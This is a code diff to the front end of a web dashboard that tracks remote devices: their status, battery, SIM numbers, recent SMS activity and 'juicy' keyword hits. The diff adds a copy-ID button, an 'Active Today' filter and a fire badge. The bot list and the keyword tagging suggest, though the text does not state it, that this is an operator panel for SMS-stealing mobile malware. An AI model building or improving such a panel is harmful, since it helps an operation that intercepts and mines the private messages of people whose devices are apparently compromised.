@@ -192,8 +192,17 @@
     padding: 2px 4px; margin-left: 4px; color: #9ca3af; opacity: 0.4;
     transition: opacity 0.15s, color 0.15s; vertical-align: middle;
   }
-  .bell-btn.active { color: #f59e0b; opacity: 1; }
+  .bell-btn.active { color: #22c55e; opacity: 1; }  /* green when alert active */
   .bell-btn:hover  { opacity: 0.85; }
+
+  /* ── Device ID copy + fire badge ── */
+  .devid-cell { display:inline-flex; align-items:center; gap:4px; cursor:pointer; }
+  .devid-cell code { font-size:11px; color:var(--muted); }
+  .devid-cell:hover code { color:var(--accent); }
+  .devid-copy-flash { font-size:10px; color:var(--green); display:none; }
+  .devid-copy-flash.show { display:inline; }
+  .fire-badge { font-size:13px; title:attr(title); }
+
   .bot-list-item {
     display: flex; align-items: center; justify-content: space-between;
     padding: 6px 0; border-bottom: 1px solid var(--border); gap: 8px;
@@ -688,6 +697,7 @@ async function openUrl(id) {
     <button class="filter-btn" onclick="setFilter('offline',this)">🔴 Offline (${offline})</button>
     ${juicy ? `<button class="filter-btn" onclick="setFilter('juicy',this)">🎯 Juicy (${juicy})</button>` : ''}
     ${sim1 ? `<button class="filter-btn" onclick="setFilter('sim1',this)">📱 Has SIM1 (${sim1})</button>` : ''}
+    <button class="filter-btn" onclick="setFilter('today',this)">🔥 Active Today (${currentDevices.filter(d=>_isActiveToday(d.lastActivity)).length})</button>
   `;
 
   renderDevices();
@@ -700,12 +710,44 @@ function setFilter(f, btn) {
   renderDevices();
 }
 
+// Returns true if lastActivity string is within the last 24 hours
+function _isActiveToday(lastActivity) {
+  if (!lastActivity || lastActivity === 'Unknown') return false;
+  try {
+    const ts = new Date(lastActivity).getTime();
+    return !isNaN(ts) && (Date.now() - ts) < 86400000;
+  } catch { return false; }
+}
+
+// Copy device ID to clipboard; flash the ✓ indicator
+function copyDeviceId(evt, deviceId, container) {
+  evt.stopPropagation();
+  navigator.clipboard.writeText(deviceId).then(() => {
+    const flash = container.querySelector('.devid-copy-flash');
+    if (flash) {
+      flash.classList.add('show');
+      setTimeout(() => flash.classList.remove('show'), 1500);
+    }
+  }).catch(() => {
+    // Fallback for non-HTTPS: select the text
+    const code = container.querySelector('code');
+    if (code) {
+      const sel = window.getSelection();
+      const range = document.createRange();
+      range.selectNodeContents(code);
+      sel.removeAllRanges();
+      sel.addRange(range);
+    }
+  });
+}
+
 function renderDevices() {
   let list = currentDevices;
   if (activeFilter === 'online')  list = list.filter(d => d.status === 'online');
   if (activeFilter === 'offline') list = list.filter(d => d.status === 'offline');
   if (activeFilter === 'juicy')   list = list.filter(d => d.juicyKeywords.length > 0);
   if (activeFilter === 'sim1')    list = list.filter(d => d.sim1Clean);
+  if (activeFilter === 'today')   list = list.filter(d => _isActiveToday(d.lastActivity));
 
   const tbody = document.getElementById('device-tbody');
   if (!list.length) {
@@ -713,8 +755,16 @@ function renderDevices() {
     return;
   }
 
+  // Decide whether to show brand column (hide if ALL devices have no real brand)
+  const allUnknownBrand = currentDevices.every(d => !d.brand || d.brand === 'Unknown');
+
+  // Update thead visibility
+  const brandTh = document.querySelector('#device-table thead th:nth-child(4)');
+  if (brandTh) brandTh.style.display = allUnknownBrand ? 'none' : '';
+
   tbody.innerHTML = list.map((d, i) => {
     const isOn = d.status === 'online';
+    const activeToday = _isActiveToday(d.lastActivity);
 
     // SIM rendering: if has clean number → paanel link, else → editable field
     function simCell(simRaw, simClean, simOverride, slot, deviceId) {
@@ -745,12 +795,28 @@ function renderDevices() {
       ? d.juicyKeywords.map(k => `<span class="kw-tag">${k}</span>`).join('')
       : '—';
 
+    // Brand cell: hidden if all unknown
+    const brandCell = allUnknownBrand
+      ? ''
+      : `<td style="font-size:12px">${(!d.brand || d.brand === 'Unknown') ? '<span style="color:var(--border)">—</span>' : d.brand}</td>`;
+
+    // Device ID cell: click to copy + fire badge if active today
+    const fireBadge = activeToday
+      ? `<span class="fire-badge" title="SMS in last 24h">🔥</span>`
+      : '';
+    const deviceIdCell = `<td>
+      <div class="devid-cell" onclick="copyDeviceId(event,'${d.deviceId}',this)" title="Click to copy">
+        ${fireBadge}<code>${d.deviceId.slice(0,16)}</code>
+        <span class="devid-copy-flash" id="cf-${d.deviceId.slice(0,8)}">✓</span>
+      </div>
+    </td>`;
+
     return `<tr>
       <td style="color:var(--muted)">${i+1}</td>
       <td class="name-cell">${nameCell(d.deviceId)}</td>
       <td><span class="status-dot ${isOn?'dot-online':'dot-offline'}"></span>${isOn?'Online':'Offline'}</td>
-      <td>${d.brand}</td>
-      <td><code style="font-size:11px;color:var(--muted)">${d.deviceId.slice(0,16)}</code></td>
+      ${brandCell}
+      ${deviceIdCell}
       <td>${d.battery}</td>
       <td>${sim1Html}</td>
       <td>${sim2Html}</td>
